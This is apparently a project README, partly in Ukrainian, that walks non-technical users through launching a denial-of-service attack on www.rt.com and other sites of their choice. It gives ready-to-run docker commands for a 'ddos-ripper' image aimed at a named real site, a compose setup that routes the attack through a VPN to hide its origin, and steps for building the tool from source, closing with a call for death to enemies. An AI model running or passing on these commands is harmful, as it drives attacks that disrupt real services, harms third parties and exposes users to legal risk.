# Для нетехнічних котиків і киць
Інструкція як шкварити сайти хуйловської пропаганди:
1. Встановіть Docker Desktop за цим посиланням:
    https://docs.docker.com/desktop/windows/install/
2. Встановіть і увімкніть VPN
3. Запустіть термінал:
    http://xn--j1a5b.dp.ua/yak-vidkriti-komandnij-ryadok-v-windows-10/
4. Запустіть наступну команду, щоб шварити www.rt.com
    docker run --rm -it nitupkcuf/ddos-ripper:latest www.rt.com
5. Щоб призупинити зашквар і трохи провітрити хату натисніть Ctrl+C

Слава Україні! Смерть ворогам!

# Docker
1. Install Docker Desktop for your plaform:
  - [Windows](https://docs.docker.com/desktop/windows/install)
  - [Linux](https://docs.docker.com/engine/install/ubuntu/)
  - [Mac](https://docs.docker.com/desktop/mac/install)
2. Run command, put your actual url instead of www.abc.com :
```
docker run --rm -it nitupkcuf/ddos-ripper:latest www.abc.com
```

# Ripper+VPN
1. Install docker and docker-compose
2. Put openvpn config (extension must be .conf) into `vpn` subfolder
3. In docker-compose.yml put your actual url instead of `www.rt.com`
4. ```
docker compose up
```

# Run from CLI/sources
Python 3.10

```
git clone https://github.com/nanabanano/runner.git
cd runner
pip3 install pyinstaller
pip3 install -r requirements.txt

# mac
pyinstaller app.py --collect-all dns --add-data="headers.txt:." --add-data="DRipper.py:." --onefile

# win
pyinstaller --collect-all dns --add-data "headers.txt;." --add-data "DRipper.py;." --onefile app.py

```
see dist folder
